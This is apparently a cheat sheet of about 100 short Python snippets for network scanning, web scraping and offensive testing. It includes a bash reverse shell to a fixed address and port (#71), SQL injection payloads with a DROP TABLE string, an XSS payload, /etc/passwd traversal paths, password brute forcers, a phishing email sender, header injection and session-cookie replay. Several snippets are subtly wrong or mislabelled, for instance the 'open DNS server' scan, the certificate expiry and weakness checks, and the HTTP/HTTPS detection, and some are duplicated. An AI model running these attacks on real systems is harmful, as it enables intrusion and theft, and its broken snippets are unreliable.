# 100 plus advanced Python scripting


### 0. Open the file 'parameters/param.txt' and iterate over each line
```python
with open('parameters/param.txt', 'r') as file:
    for word in file:
        print(word.strip())  # .strip() removes leading/trailing whitespace/newlines
```


### 1. **Network Scanning with `scapy`**
```python
from scapy.all import *
packet = IP(dst="192.168.1.1")/ICMP()
response = sr1(packet)
```

### 2. **Port Scanning with `socket`**
```python
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('192.168.1.1', 80))
```

### 3. **HTTP Requests with `requests`**
```python
import requests
response = requests.get('http://example.com')
```

### 4. **Simple Web Scraping with `BeautifulSoup`**
```python
from bs4 import BeautifulSoup
import requests
response = requests.get('http://example.com')
soup = BeautifulSoup(response.content, 'html.parser')
```

### 5. **Automating Browser Actions with `Selenium`**
```python
from selenium import webdriver
driver = webdriver.Chrome()
driver.get('http://example.com')
```

### 6. **Capturing Screenshots with `pyautogui`**
```python
import pyautogui
pyautogui.screenshot('screenshot.png')
```

### 7. **Brute Force with `itertools`**
```python
import itertools
for combination in itertools.product('abc', repeat=3):
    print(''.join(combination))
```

### 8. **DNS Lookup with `socket`**
```python
import socket
ip_address = socket.gethostbyname('example.com')
```

### 9. **TCP Connection with `socket`**
```python
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('example.com', 80))
sock.send(b'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n')
```

### 10. **SSL/TLS Certificate Validation**
```python
import ssl
import socket
hostname = 'example.com'
context = ssl.create_default_context()
connection = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=hostname)
connection.connect((hostname, 443))
cert = connection.getpeercert()
print(cert)
```

### 11. **JSON Handling**
```python
import json
data = '{"name": "Alice", "age": 30}'
parsed_data = json.loads(data)
print(parsed_data['name'])
```

### 12. **Regex for URL Matching**
```python
import re
url = "http://example.com"
match = re.match(r"(https?://)([a-zA-Z0-9.-]+)", url)
```

### 13. **File Download with `requests`**
```python
import requests
url = 'http://example.com/file.zip'
response = requests.get(url)
with open('file.zip', 'wb') as f:
    f.write(response.content)
```

### 14. **IP Geolocation with `requests`**
```python
import requests
response = requests.get('https://ipinfo.io')
print(response.json())
```

### 15. **Performing HTTP POST Requests**
```python
import requests
data = {'key': 'value'}
response = requests.post('http://example.com', data=data)
```

### 16. **Automating Login with `Selenium`**
```python
from selenium import webdriver
driver = webdriver.Chrome()
driver.get('http://example.com/login')
driver.find_element_by_name('username').send_keys('admin')
driver.find_element_by_name('password').send_keys('password')
driver.find_element_by_name('submit').click()
```

### 17. **Subdomain Bruteforce with `requests`**
```python
import requests
subdomains = ['www', 'mail', 'ftp']
for subdomain in subdomains:
    url = f'http://{subdomain}.example.com'
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f'Found: {url}')
    except requests.exceptions.RequestException:
        pass
```

### 18. **Automating Nmap Scans**
```python
import os
os.system('nmap -sP 192.168.1.0/24')
```

### 19. **Automating SSH with `paramiko`**
```python
import paramiko
client = paramiko.SSHClient()
client.load_system_host_keys()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect('hostname', username='user', password='passwd')
stdin, stdout, stderr = client.exec_command('uptime')
print(stdout.read().decode())
client.close()
```

### 20. **Sending Emails with `smtplib`**
```python
import smtplib
from email.mime.text import MIMEText

msg = MIMEText('This is a test email')
msg['Subject'] = 'Test Email'
msg['From'] = 'your_email@example.com'
msg['To'] = 'recipient@example.com'

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login('your_email@example.com', 'password')
server.sendmail('your_email@example.com', 'recipient@example.com', msg.as_string())
server.quit()
```

### 21. **Port Scanning with `scapy`**
```python
from scapy.all import *
ip = "192.168.1.1"
for port in range(20, 1025):
    pkt = IP(dst=ip)/TCP(dport=port, flags="S")
    response = sr1(pkt, timeout=1, verbose=0)
    if response:
        print(f"Port {port} is open")
```

### 22. **HTTP Header Inspection**
```python
import requests
response = requests.head('http://example.com')
print(response.headers)
```

### 23. **Ping Sweep**
```python
import os
for ip in range(1, 255):
    response = os.system(f"ping -c 1 192.168.1.{ip}")
    if response == 0:
        print(f"192.168.1.{ip} is up")
```

### 24. **Token Brute Force with `requests`**
```python
import requests
for token in range(1000, 9999):
    url = f'http://example.com/api?token={token}'
    response = requests.get(url)
    if 'success' in response.text:
        print(f"Valid token: {token}")
        break
```

### 25. **SSL Certificate Expiry Check**
```python
import ssl
import socket
hostname = 'example.com'
port = 443
context = ssl.create_default_context()
connection = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=hostname)
connection.connect((hostname, port))
cert = connection.getpeercert()
print(cert['notAfter'])
```

### 26. **Check URL Response Time**
```python
import requests
url = 'http://example.com'
response = requests.get(url)
print(f'Response time: {response.elapsed.total_seconds()} seconds')
```

### 27. **Check HTTP Status Code**
```python
import requests
response = requests.get('http://example.com')
print(response.status_code)
```

### 28. **Save Response Content to File**
```python
import requests
response = requests.get('http://example.com')
with open('page.html', 'w') as file:
    file.write(response.text)
```

### 29. **Extract URLs from Web Page**
```python
from bs4 import BeautifulSoup
import requests
url = 'http://example.com'
response = requests.get(url)
soup = BeautifulSoup(response.content, 'html.parser')
for link in soup.find_all('a'):
    print(link.get('href'))
```

### 30. **Retrieve HTTP Headers**
```python
import requests
response = requests.head('http://example.com')
print(response.headers)
```

### 31. **Automated Web Form Filling**
```python
from selenium import webdriver
driver = webdriver.Chrome()
driver.get('http://example.com/login')
driver.find_element_by_name('username').send_keys('admin')
driver.find_element_by_name('password').send_keys('password')
driver.find_element_by_name('submit').click()
```

### 32. **Bruteforce a Password with `requests`**
```python
import requests
for password in ['password1', 'password2', 'password3']:
    response = requests.post('http://example.com/login', data={'username': 'admin', 'password': password})
    if 'Welcome' in response.text:
        print(f'Password found: {password}')
        break
```

### 33. **Automating OS Command Execution with `os`**
```python
import os
os.system('ls -la')
```

### 34. **Uploading Files with `requests`**
```python
import requests
files = {'file': open('file.txt', 'rb')}
response = requests.post('http://example.com/upload', files=files)
```

### 35. **Check for Open Ports**
```python
import socket
def check_open_port(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((host, port))
    if result == 0:
        print(f"Port {port} is open")
    else:
        print(f"Port {port} is closed")
check_open_port('192.168.1.1', 80)
```

### 36. **Network Interface Details with `psutil`**
```python
import psutil
interfaces = psutil.net_if_addrs()
print(interfaces)
```

### 37. **Get MAC Address**
```python
import psutil
interfaces = psutil.net_if_addrs()
for interface, addrs in interfaces.items():
    for addr in addrs:
        if addr.family == psutil.AF_LINK:
            print(f'{interface}: {addr.address}')
```

### 38. **System Information with `platform`**
```python
import platform
print(platform.system())
print(platform.node())
print(platform.release())
```

### 39. **Checking Available Disk Space**
```python
import shutil
total, used, free = shutil.disk_usage("/")
print(f"Free space: {free // (2**30)} GB")
```

### 40. **Accessing Localhost Services**
```python
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('localhost', 8080))
```



### 41. **Perform DNS Lookup with `socket`**
```python
import socket
domain = "example.com"
ip = socket.gethostbyname(domain)
print(f"IP Address of {domain}: {ip}")
```

### 42. **HTTP Response Time Measurement**
```python
import requests
url = 'http://example.com'
response = requests.get(url)
print(f'Response time: {response.elapsed.total_seconds()} seconds')
```

### 43. **HTTP Request Header Inspection**
```python
import requests
response = requests.head('http://example.com')
print(response.headers)
```

### 44. **Extract and Save HTTP Cookies**
```python
import requests
response = requests.get('http://example.com')
cookies = response.cookies
print(cookies)
```

### 45. **Checking Port Status with `socket`**
```python
import socket
def is_port_open(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = s.connect_ex((host, port))
    return result == 0
print(is_port_open('192.168.1.1', 80))
```

### 46. **Capture Screenshot of Web Page with `selenium`**
```python
from selenium import webdriver
driver = webdriver.Chrome()
driver.get("http://example.com")
driver.save_screenshot("example_screenshot.png")
driver.quit()
```

### 47. **Perform Reverse DNS Lookup**
```python
import socket
ip = '192.168.1.1'
hostname = socket.gethostbyaddr(ip)
print(hostname)
```

### 48. **Scan for Open Ports with `nmap` via `python-nmap`**
```python
import nmap
nm = nmap.PortScanner()
nm.scan('192.168.1.1', '22-1024')
print(nm.all_hosts())
```

### 49. **Automating HTTP Authentication with `requests`**
```python
import requests
url = 'http://example.com'
auth = ('user', 'password')
response = requests.get(url, auth=auth)
print(response.status_code)
```

### 50. **Directory Traversal Vulnerability Automation**
```python
import requests
paths = ['../../../../etc/passwd', '....//....//....//etc/passwd']
for path in paths:
    response = requests.get(f'http://example.com/{path}')
    if 'root' in response.text:
        print(f'Vulnerable path: {path}')
```

### 51. **Web Scraping Form Fields with `BeautifulSoup`**
```python
from bs4 import BeautifulSoup
import requests
url = 'http://example.com/form'
response = requests.get(url)
soup = BeautifulSoup(response.content, 'html.parser')
for form in soup.find_all('form'):
    for input_tag in form.find_all('input'):
        print(input_tag.get('name'))
```

### 52. **Checking for SSL Vulnerabilities with `ssl`**
```python
import ssl
import socket
hostname = 'example.com'
context = ssl.create_default_context()
conn = context.wrap_socket(socket.socket(), server_hostname=hostname)
conn.connect((hostname, 443))
cert = conn.getpeercert()
print(cert)
```

### 53. **Basic Web Scraping with `requests` and `BeautifulSoup`**
```python
import requests
from bs4 import BeautifulSoup
url = 'http://example.com'
response = requests.get(url)
soup = BeautifulSoup(response.text, 'html.parser')
print(soup.prettify())
```

### 54. **JSON Web Token (JWT) Generation**
```python
import jwt
token = jwt.encode({"user": "admin"}, "secret", algorithm="HS256")
print(token)
```

### 55. **Automating HTTP POST Request for Login**
```python
import requests
login_url = 'http://example.com/login'
payload = {'username': 'admin', 'password': 'password'}
response = requests.post(login_url, data=payload)
print(response.text)
```

### 56. **Automating Social Engineering Attack via Email**
```python
import smtplib
from email.mime.text import MIMEText
msg = MIMEText('This is a phishing email')
msg['Subject'] = 'Phishing Test'
msg['From'] = 'attacker@example.com'
msg['To'] = 'victim@example.com'
server = smtplib.SMTP('smtp.example.com')
server.sendmail('attacker@example.com', 'victim@example.com', msg.as_string())
server.quit()
```

### 57. **Port Scanning with `socket`**
```python
import socket
for port in range(20, 1025):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = s.connect_ex(('192.168.1.1', port))
    if result == 0:
        print(f'Port {port} is open')
```

### 58. **Shell Command Execution via `subprocess`**
```python
import subprocess
output = subprocess.check_output(["ls", "-la"])
print(output.decode())
```

### 59. **Automated SSL Certificate Expiry Check**
```python
import ssl
import socket
hostname = 'example.com'
port = 443
context = ssl.create_default_context()
connection = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=hostname)
connection.connect((hostname, port))
cert = connection.getpeercert()
print(f'Certificate Expiry Date: {cert["notAfter"]}')
```

### 60. **Directory Bruteforce Attack with `requests`**
```python
import requests
subdirs = ['admin', 'login', 'dashboard']
for subdir in subdirs:
    url = f'http://example.com/{subdir}'
    response = requests.get(url)
    if response.status_code == 200:
        print(f'Found directory: {url}')
```

### 61. **Check for Open Ports Using `psutil`**
```python
import psutil
open_ports = [p.laddr for p in psutil.net_connections() if p.status == 'LISTEN']
print(open_ports)
```

### 62. **HTTP Header Injection Attack**
```python
import requests
payload = {'name': 'admin', 'email': 'admin@domain.com\nSet-Cookie: admin=true'}
response = requests.post('http://example.com/contact', data=payload)
print(response.text)
```

### 63. **Sending Custom HTTP Headers**
```python
import requests
headers = {'X-Custom-Header': 'malicious_value'}
response = requests.get('http://example.com', headers=headers)
print(response.status_code)
```

### 64. **Automated Password Cracking with `requests`**
```python
import requests
passwords = ['12345', 'password', 'admin123']
for pwd in passwords:
    response = requests.post('http://example.com/login', data={'username': 'admin', 'password': pwd})
    if 'Welcome' in response.text:
        print(f"Password found: {pwd}")
        break
```

### 65. **Subdomain Enumeration with `requests`**
```python
import requests
subdomains = ['www', 'mail', 'ftp']
for subdomain in subdomains:
    url = f'http://{subdomain}.example.com'
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f'Found: {url}')
    except requests.exceptions.RequestException:
        pass
```

### 66. **Basic Web Application Login Automation**
```python
from selenium import webdriver
driver = webdriver.Chrome()
driver.get('http://example.com/login')
driver.find_element_by_name('username').send_keys('admin')
driver.find_element_by_name('password').send_keys('password')
driver.find_element_by_name('submit').click()
```

### 67. **Check for Clickjacking Vulnerability**
```python
import requests
headers = {'X-Frame-Options': 'DENY'}
response = requests.get('http://example.com', headers=headers)
if 'X-Frame-Options' not in response.headers:
    print("Vulnerable to clickjacking")
```

### 68. **Retrieve HTTP Headers from URL**
```python
import requests
response = requests.head('http://example.com')
print(response.headers)
```

### 69. **Scan for SQL Injection Vulnerabilities**
```python
import requests
payloads = ["' OR 1=1 --", "' DROP TABLE users; --"]
for payload in payloads:
    url = f'http://example.com/search?query={payload}'
    response = requests.get(url)
    if "error" in response.text:
        print(f'Potential SQL Injection: {url}')
```

### 70. **Automating Brute Force for FTP Login**
```python
from ftplib import FTP
ftp = FTP('example.com')
ftp.login('admin', 'password')
print(ftp.getwelcome())
```

### 71. **Automated Reverse Shell via `subprocess`**
```python
import subprocess
subprocess.Popen(['bash', '-c', 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'])
```

### 72. **Extract Email Addresses from Text**
```python
import re
text = "Contact us at admin@example.com"
emails = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b', text)
print(emails)
```

### 73. **Send HTTP Requests Simulating User Input**
```python
import requests
payload = {'username': 'admin', 'password': 'test'}
response = requests.post('http://example.com/login', data=payload)
print(response.status_code)
```

### 74. **Scan for Open DNS Servers**
```python
import socket
for i in range(1, 255):
    ip = f'192.168.1.{i}'
    try:
        socket.gethostbyname(ip)
        print(f'Open DNS server: {ip}')
    except socket.error:
        pass
```

### 75. **Automated SMTP Brute Force**
```python
import smtplib
for password in ['password', '12345', 'admin']:
    try:
        server = smtplib.SMTP('smtp.example.com', 587)
        server.login('user@example.com', password)
        print(f'Password found: {password}')
        break
    except smtplib.SMTPAuthenticationError:
        pass
```

### 76. **Perform Ping Sweep**
```python
import os
for ip in range(1, 255):
    response = os.system(f"ping -c 1 192.168.1.{ip}")
    if response == 0:
        print(f"192.168.1.{ip} is up")
```

### 77. **Port Scanning with `nmap`**
```python
import nmap
nm = nmap.PortScanner()
nm.scan('192.168.1.1', '22-80')
print(nm.all_hosts())
```

### 78. **Extract Subdomains using `sublist3r`**
```python
import subprocess
subprocess.run(['sublist3r', '-d', 'example.com'])
```

### 79. **Check for Open FTP Ports**
```python
import socket
port = 21
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result = sock.connect_ex(('192.168.1.1', port))
if result == 0:
    print("FTP Port is open")
else:
    print("FTP Port is closed")
```

### 80. **Automate Password Cracking with `hashlib`**
```python
import hashlib
password = 'password'
hashed_password = hashlib.md5(password.encode()).hexdigest()
print(f"MD5 Hash: {hashed_password}")
```

### 81. **

Test SSL/TLS Vulnerabilities with `OpenSSL`**
```python
import subprocess
subprocess.run(['openssl', 's_client', '-connect', 'example.com:443'])
```

### 82. **Automated XSS Testing with `requests`**
```python
payload = "<script>alert('XSS');</script>"
url = f"http://example.com/search?q={payload}"
response = requests.get(url)
if payload in response.text:
    print("Vulnerable to XSS")
```

### 83. **Web Crawler for Sensitive Data**
```python
import requests
from bs4 import BeautifulSoup
url = "http://example.com"
response = requests.get(url)
soup = BeautifulSoup(response.text, 'html.parser')
for link in soup.find_all('a'):
    if 'login' in link.get('href'):
        print(f"Login page found: {link.get('href')}")
```

### 84. **SQL Injection Check with `requests`**
```python
payload = "' OR 1=1 --"
response = requests.get(f"http://example.com?search={payload}")
if "database error" in response.text:
    print("Potential SQL Injection Vulnerability")
```

### 85. **Test HTTP Response for Caching**
```python
response = requests.get("http://example.com")
print(response.headers.get('Cache-Control'))
```

### 86. **Brute Force HTTP Headers**
```python
import requests
headers = {'User-Agent': 'Mozilla/5.0'}
for ua in ['Mozilla/4.0', 'Mozilla/5.0']:
    headers['User-Agent'] = ua
    response = requests.get('http://example.com', headers=headers)
    print(f'{ua}: {response.status_code}')
```

### 87. **Test for Weak Passwords with `hashlib`**
```python
import hashlib
for password in ['password', '12345', 'admin']:
    hash_pw = hashlib.md5(password.encode()).hexdigest()
    print(f"MD5: {hash_pw}")
```

### 88. **Check for Secure Cookies**
```python
import requests
response = requests.get("http://example.com")
if response.cookies.get('secure'):
    print("Secure cookie found")
```

### 89. **Detect SSL Misconfiguration**
```python
import ssl
import socket
hostname = 'example.com'
port = 443
context = ssl.create_default_context()
connection = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=hostname)
connection.connect((hostname, port))
cert = connection.getpeercert()
if "expired" in cert['notAfter']:
    print("SSL certificate is expired")
```

### 90. **Automating Web Application Firewall (WAF) Testing**
```python
import requests
headers = {'User-Agent': 'SQLMap'}
response = requests.get('http://example.com', headers=headers)
print(response.status_code)
```

### 91. **Network Packet Sniffing with `scapy`**
```python
from scapy.all import sniff
packets = sniff(count=10)
packets.summary()
```

### 92. **Extract HTTP Response with `curl`**
```python
import subprocess
response = subprocess.check_output(['curl', '-I', 'http://example.com'])
print(response.decode())
```

### 93. **Enumerate Subdomains with `amass`**
```python
import subprocess
subdomains = subprocess.check_output(['amass', 'enum', '-d', 'example.com'])
print(subdomains.decode())
```

### 94. **Check for Open SMTP Ports**
```python
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result = sock.connect_ex(('smtp.example.com', 25))
if result == 0:
    print("SMTP Port is open")
else:
    print("SMTP Port is closed")
```

### 95. **FTP Anonymous Login Test**
```python
from ftplib import FTP
ftp = FTP('example.com')
ftp.login()
print(ftp.getwelcome())
```

### 96. **Detecting SSL/TLS Certificate Weaknesses**
```python
import ssl
import socket
hostname = 'example.com'
context = ssl.create_default_context()
connection = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=hostname)
connection.connect((hostname, 443))
cert = connection.getpeercert()
if 'SHA1' in cert['signatureAlgorithm']:
    print("Weak SSL/TLS certificate")
```

### 97. **HTTP/HTTPS Protocol Detection**
```python
import requests
url = 'http://example.com'
response = requests.get(url)
if response.status_code == 200:
    print("HTTP Protocol")
else:
    print("HTTPS Protocol")
```

### 98. **Directory Content Listing with `requests`**
```python
import requests
response = requests.get('http://example.com/directory/')
if response.status_code == 200:
    print(response.text)
```

### 99. **Automated Session Hijacking**
```python
import requests
headers = {'Cookie': 'session=abcd1234'}
response = requests.get('http://example.com/dashboard', headers=headers)
print(response.text)
```

### 100. **HTTP Response Time Testing with `time`**
```python
import time
start_time = time.time()
requests.get('http://example.com')
end_time = time.time()
print(f"Request Time: {end_time - start_time} seconds")
``` 

